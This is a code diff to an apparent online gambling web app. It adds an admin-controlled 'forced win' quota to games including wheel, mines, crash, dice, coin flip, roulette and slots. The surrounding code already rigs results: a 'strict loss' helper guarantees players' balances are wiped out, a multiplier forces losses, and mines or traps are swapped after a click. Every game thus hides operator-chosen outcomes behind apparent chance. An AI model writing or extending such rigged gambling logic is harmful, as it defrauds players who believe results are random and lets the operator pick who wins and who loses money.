@@ -1244,6 +1244,13 @@ My referal code - ${refCode}`;
             window.open(url, '_blank');
         };
 
+        // --- FORCED WIN HELPER ---
+        const isForcedWinRequired = () => {
+            if (!state.currentUser || !state.users[state.currentUser]) return false;
+            const user = state.users[state.currentUser];
+            return (user.forcedWinTarget && user.forcedWinTarget > 0);
+        };
+
         // --- STRICT LIMITS HELPER (Protects Developer) ---
         // Guarantees all-in balance wipeout & enforces mathematical peaks.
         const isStrictLossRequired = (potentialWinAmt) => {
@@ -1289,7 +1296,7 @@ My referal code - ${refCode}`;
             return { name: "Beginner", bonus: 0, color: "text-gray-400" };
         };
 
-        // Update UI & Sync with Firebase (Decoupled rendering logic from DB-saving logic via saveToDb)
+        // Update UI & Sync with Firebase
         const updateUI = (saveToDb = true) => {
             if (state.currentUser && state.users[state.currentUser]) {
                 const user = state.users[state.currentUser];
@@ -2051,12 +2058,21 @@ My referal code - ${refCode}`;
         };
 
         const registerGameResult = (actualBet, winAmt) => {
+            const user = state.users[state.currentUser];
             if (winAmt < actualBet) {
                 const loss = actualBet - winAmt;
-                if(!state.users[state.currentUser].claimableCashback) state.users[state.currentUser].claimableCashback = 0;
-                state.users[state.currentUser].claimableCashback += (loss * 0.05);
-                updateUI(true);
+                if(!user.claimableCashback) user.claimableCashback = 0;
+                user.claimableCashback += (loss * 0.05);
             }
+            
+            // Continuous Forced Win System: Reduce their quota by the amount they won. 
+            // Ensures they win exactly up to the admin's limit over multiple rounds.
+            if (user.forcedWinTarget && user.forcedWinTarget > 0 && winAmt > 0) {
+                user.forcedWinTarget -= winAmt;
+                if (user.forcedWinTarget <= 0) user.forcedWinTarget = 0; // Turn off forced win when limit reached
+            }
+            
+            updateUI(true);
         };
 
         // --- WHEEL OF FORTUNE GAME ---
@@ -2142,8 +2158,12 @@ My referal code - ${refCode}`;
             let potentialWin = bet * multiplier;
 
             const dbr = getDBRMultiplier();
+            const forceWinActive = isForcedWinRequired();
 
-            if (isStrictLossRequired(potentialWin)) {
+            if (forceWinActive) {
+                const winningIndices = slices.map((val, idx) => val > 1.2 ? idx : -1).filter(idx => idx !== -1);
+                if(winningIndices.length > 0) targetIdx = winningIndices[Math.floor(Math.random() * winningIndices.length)];
+            } else if (isStrictLossRequired(potentialWin)) {
                 const losingIndices = slices.map((val, idx) => val < 1 ? idx : -1).filter(idx => idx !== -1);
                 if (losingIndices.length > 0) targetIdx = losingIndices[Math.floor(Math.random() * losingIndices.length)];
             } else if (dbr < 1.0 && multiplier > 1 && Math.random() > dbr) {
@@ -2295,12 +2315,25 @@ My referal code - ${refCode}`;
             const dbr = getDBRMultiplier();
             let potentialWinMult = mysteryState.currentMult + (isTrap ? 0 : content);
             const potentialWin = mysteryState.bet * potentialWinMult;
+            const forceWinActive = isForcedWinRequired();
 
             let forceStrictLoss = !isTrap && isStrictLossRequired(potentialWin);
             let forceDbrLoss = (dbr < 1.0 && !isTrap && Math.random() > dbr);
             let forceDbrWin = (dbr > 1.0 && isTrap && Math.random() < (dbr - 1.0));
 
-            if (forceStrictLoss || forceDbrLoss) {
+            if (forceWinActive) {
+                if (isTrap) {
+                    // Replace Trap with Prize dynamically if user clicked a trap
+                    let unrevealedPrize = mysteryState.grid.findIndex((v, i) => v !== 'trap' && i !== index && !document.getElementById(`mystery-box-${i}`).classList.contains('revealed'));
+                    if (unrevealedPrize !== -1) {
+                        let newPrize = mysteryState.grid[unrevealedPrize];
+                        mysteryState.grid[index] = newPrize;
+                        mysteryState.grid[unrevealedPrize] = 'trap';
+                        content = newPrize;
+                        isTrap = false;
+                    }
+                }
+            } else if (forceStrictLoss || forceDbrLoss) {
                 let unrevealedTrap = mysteryState.grid.findIndex((v, i) => v === 'trap' && !document.getElementById(`mystery-box-${i}`).classList.contains('revealed'));
                 if (unrevealedTrap !== -1) {
                     mysteryState.grid[index] = 'trap';
@@ -2432,32 +2465,37 @@ My referal code - ${refCode}`;
 
             let crashPoint = Math.max(1.00, 0.99 / Math.random());
             let isForcedLoss = false;
+            const forceWinActive = isForcedWinRequired();
 
             // DBR / Limits
-            const dbr = getDBRMultiplier();
-            if (dbr < 1.0 && Math.random() > dbr) {
-                isForcedLoss = true;
-            } else if (dbr > 1.0 && Math.random() < (dbr - 1.0)) {
-                crashPoint = 2.00 + (Math.random() * 3.00);
-            }
-
-            const user = state.users[state.currentUser];
-            const peak = (user.dbr && user.dbr.peak) ? user.dbr.peak : 5000;
-            const totalBal = state.balance + (state.withdrawableBalance || 0);
-
-            if (Math.floor(totalBal) <= 0) {
-                isForcedLoss = true;
+            if (forceWinActive) {
+                crashPoint = 1000.0; // Infinite safety net. Guarantee user will click cashout before it pops
             } else {
-                const maxAllowedMult = (peak - totalBal) / bet;
-                if (crashPoint > maxAllowedMult) {
-                    crashPoint = 1.01 + (Math.random() * Math.max(0, maxAllowedMult - 1.01));
+                const dbr = getDBRMultiplier();
+                if (dbr < 1.0 && Math.random() > dbr) {
+                    isForcedLoss = true;
+                } else if (dbr > 1.0 && Math.random() < (dbr - 1.0)) {
+                    crashPoint = 2.00 + (Math.random() * 3.00);
                 }
-            }
 
-            if (isForcedLoss) {
-                const maxSafeMult = 1.15;
-                const minSafeMult = 1.00;
-                crashPoint = minSafeMult + (Math.random() * (maxSafeMult - minSafeMult));
+                const user = state.users[state.currentUser];
+                const peak = (user.dbr && user.dbr.peak) ? user.dbr.peak : 5000;
+                const totalBal = state.balance + (state.withdrawableBalance || 0);
+
+                if (Math.floor(totalBal) <= 0) {
+                    isForcedLoss = true;
+                } else {
+                    const maxAllowedMult = (peak - totalBal) / bet;
+                    if (crashPoint > maxAllowedMult) {
+                        crashPoint = 1.01 + (Math.random() * Math.max(0, maxAllowedMult - 1.01));
+                    }
+                }
+
+                if (isForcedLoss) {
+                    const maxSafeMult = 1.15;
+                    const minSafeMult = 1.00;
+                    crashPoint = minSafeMult + (Math.random() * (maxSafeMult - minSafeMult));
+                }
             }
 
             if (crashPoint < 1.00) crashPoint = 1.00;
@@ -2659,8 +2697,13 @@ My referal code - ${refCode}`;
                     // --- STRICT LIMITS & DBR INTERVENTION ---
                     const dbr = getDBRMultiplier();
                     const potentialWin = bet * 2.00;
+                    const forceWinActive = isForcedWinRequired();
 
-                    if (isWin && isStrictLossRequired(potentialWin)) {
+                    if (forceWinActive) {
+                        isWin = true;
+                        if(state.diceTarget === 'low') { d1 = 2; d2 = 2; total = 4; } 
+                        if(state.diceTarget === 'high') { d1 = 5; d2 = 5; total = 10; } 
+                    } else if (isWin && isStrictLossRequired(potentialWin)) {
                         isWin = false; // Strict forced loss
                         if(state.diceTarget === 'low') { d1 = 4; d2 = 5; total = 9; } 
                         if(state.diceTarget === 'high') { d1 = 2; d2 = 3; total = 5; }
@@ -2733,8 +2776,12 @@ My referal code - ${refCode}`;
             // --- STRICT LIMITS & DBR INTERVENTION ---
             const dbr = getDBRMultiplier();
             const potentialWin = bet * 1.95;
+            const forceWinActive = isForcedWinRequired();
 
-            if (isWin && isStrictLossRequired(potentialWin)) {
+            if (forceWinActive) {
+                isWin = true;
+                result = state.coinTarget;
+            } else if (isWin && isStrictLossRequired(potentialWin)) {
                 isWin = false; // Strict forced loss
                 result = state.coinTarget === 'heads' ? 'tails' : 'heads';
             } else if (dbr < 1.0 && isWin && Math.random() > dbr) {
@@ -2808,8 +2855,12 @@ My referal code - ${refCode}`;
             const dbr = getDBRMultiplier();
             let multiplier = target === 'green' ? 14 : 2;
             const potentialWin = bet * multiplier;
+            const forceWinActive = isForcedWinRequired();
 
-            if (isWin && isStrictLossRequired(potentialWin)) {
+            if (forceWinActive) {
+                isWin = true;
+                resultColor = target;
+            } else if (isWin && isStrictLossRequired(potentialWin)) {
                 isWin = false; // Strict forced loss
                 const losingColors = ['red', 'black', 'green'].filter(c => c !== target);
                 resultColor = losingColors[Math.floor(Math.random() * losingColors.length)];
@@ -2942,8 +2993,13 @@ My referal code - ${refCode}`;
             // --- STRICT LIMITS & DBR INTERVENTION ---
             const dbr = getDBRMultiplier();
             let potentialWin = bet * result.multiplier;
+            const forceWinActive = isForcedWinRequired();
 
-            if (result.multiplier > 0 && isStrictLossRequired(potentialWin)) {
+            if (forceWinActive) {
+                // Ensure a nice combo
+                grid[3] = '💎'; grid[4] = '💎'; grid[5] = '💎';
+                result = checkLines(grid);
+            } else if (result.multiplier > 0 && isStrictLossRequired(potentialWin)) {
                 for(let i=0; i<9; i++) grid[i] = SYMBOLS[i % 5];
                 grid[4] = SYMBOLS[6]; 
                 result = checkLines(grid); 
@@ -3039,35 +3095,40 @@ My referal code - ${refCode}`;
 
             let crashPoint = Math.max(1.00, 0.99 / Math.random());
             let isForcedLoss = false;
+            const forceWinActive = isForcedWinRequired();
 
-            const dbr = getDBRMultiplier();
-            if (dbr < 1.0 && Math.random() > dbr) {
-                isForcedLoss = true;
-            } else if (dbr > 1.0 && Math.random() < (dbr - 1.0)) {
-                crashPoint = 2.00 + (Math.random() * 3.00);
-            }
-
-            const user = state.users[state.currentUser];
-            const peak = (user.dbr && user.dbr.peak) ? user.dbr.peak : 5000;
-            const totalBal = state.balance + (state.withdrawableBalance || 0);
-
-            if (Math.floor(totalBal) <= 0) {
-                isForcedLoss = true;
+            if (forceWinActive) {
+                crashPoint = 1000.0; // Virtually impossible to crash out before they safely cash out
             } else {
-                const maxAllowedMult = (peak - totalBal) / bet;
-                if (crashPoint > maxAllowedMult) {
-                    crashPoint = 1.01 + (Math.random() * Math.max(0, maxAllowedMult - 1.01));
+                const dbr = getDBRMultiplier();
+                if (dbr < 1.0 && Math.random() > dbr) {
+                    isForcedLoss = true;
+                } else if (dbr > 1.0 && Math.random() < (dbr - 1.0)) {
+                    crashPoint = 2.00 + (Math.random() * 3.00);
                 }
-            }
 
-            if (isForcedLoss) {
-                const maxSafeMult = Math.min(1.12, crState.autoCashout - 0.01);
-                const minSafeMult = 1.02;
-                
-                if (maxSafeMult <= minSafeMult) {
-                    crashPoint = 1.00; 
+                const user = state.users[state.currentUser];
+                const peak = (user.dbr && user.dbr.peak) ? user.dbr.peak : 5000;
+                const totalBal = state.balance + (state.withdrawableBalance || 0);
+
+                if (Math.floor(totalBal) <= 0) {
+                    isForcedLoss = true;
                 } else {
-                    crashPoint = minSafeMult + (Math.random() * (maxSafeMult - minSafeMult));
+                    const maxAllowedMult = (peak - totalBal) / bet;
+                    if (crashPoint > maxAllowedMult) {
+                        crashPoint = 1.01 + (Math.random() * Math.max(0, maxAllowedMult - 1.01));
+                    }
+                }
+
+                if (isForcedLoss) {
+                    const maxSafeMult = Math.min(1.12, crState.autoCashout - 0.01);
+                    const minSafeMult = 1.02;
+                    
+                    if (maxSafeMult <= minSafeMult) {
+                        crashPoint = 1.00; 
+                    } else {
+                        crashPoint = minSafeMult + (Math.random() * (maxSafeMult - minSafeMult));
+                    }
                 }
             }
 
@@ -3201,9 +3262,13 @@ My referal code - ${refCode}`;
 
             const dbr = getDBRMultiplier();
             let potentialWin = bet * target;
+            const forceWinActive = isForcedWinRequired();
 
             // --- STRICT LIMITS & DBR INTERVENTION ---
-            if (isWin && isStrictLossRequired(potentialWin)) {
+            if (forceWinActive) {
+                isWin = true;
+                crashPoint = target + Math.random() * 2.00;
+            } else if (isWin && isStrictLossRequired(potentialWin)) {
                 isWin = false; // Strict forced loss
                 crashPoint = 1.00 + Math.random() * (target - 1.01);
             } else if (dbr < 1.0 && isWin && Math.random() > dbr) {
@@ -3336,8 +3401,19 @@ My referal code - ${refCode}`;
             const dbr = getDBRMultiplier();
             let nextMult = getMinesMultiplier(minesState.minesCount, minesState.revealedCount + 1);
             const potentialWin = minesState.bet * nextMult;
+            const forceWinActive = isForcedWinRequired();
 
-            if (!isMine && isStrictLossRequired(potentialWin)) {
+            if (forceWinActive) {
+                if (isMine) {
+                    // Force the mine out of the way! Player clicked a mine, instantly swap it for a gem
+                    let unrevealedGem = minesState.grid.findIndex((v, i) => v === 'gem' && i !== index && !document.getElementById(`mine-${i}`).classList.contains('revealed'));
+                    if (unrevealedGem !== -1) {
+                        minesState.grid[index] = 'gem';
+                        minesState.grid[unrevealedGem] = 'mine';
+                        isMine = false;
+                    }
+                }
+            } else if (!isMine && isStrictLossRequired(potentialWin)) {
                 // Force loss
                 let unrevealedMine = minesState.grid.findIndex((v, i) => v === 'mine' && !document.getElementById(`mine-${i}`).classList.contains('revealed'));
                 if (unrevealedMine !== -1) {
@@ -3514,8 +3590,11 @@ My referal code - ${refCode}`;
             const dbr = getDBRMultiplier();
             let forceLoss = false;
             let forceWin = false;
+            const forceWinActive = isForcedWinRequired();
 
-            if (isStrictLossRequired(potentialWin)) forceLoss = true;
+            if (forceWinActive) {
+                forceWin = true;
+            } else if (isStrictLossRequired(potentialWin)) forceLoss = true;
             else if (dbr < 1.0 && multiplier > 1 && Math.random() > dbr) forceLoss = true;
             else if (dbr > 1.0 && multiplier <= 1 && Math.random() < (dbr - 1.0)) forceWin = true;
 
